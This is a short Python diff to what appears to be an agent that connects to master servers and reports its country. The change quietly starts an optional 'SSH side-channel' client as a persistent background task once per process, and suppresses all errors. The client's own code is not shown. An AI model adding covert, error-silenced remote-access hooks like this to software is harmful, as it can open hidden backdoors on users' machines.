@@ -18,6 +18,12 @@ import ssl, hashlib
 import threading
 import numpy as np  # type: ignore
 from urllib.parse import urlparse
+# Optional SSH side-channel client
+try:
+    from agent_ssh_client import start_agent_ssh  # type: ignore
+    _HAS_AGENT_SSH = True
+except Exception:
+    _HAS_AGENT_SSH = False
 import mimetypes
 
 # Ensure Windows supports asyncio subprocesses
@@ -1009,6 +1015,13 @@ async def _connect_one_master(url: str):
                         "country": country,
                         "country_code": country_code,
                     }))
+                    # kick off SSH side-channel client once per process
+                    if _HAS_AGENT_SSH:
+                        try:
+                            # fire-and-forget persistent task
+                            asyncio.get_event_loop().create_task(start_agent_ssh(agent_id, agent_name))
+                        except Exception:
+                            pass
                 except Exception:
                     pass
                 last_log = 0.0
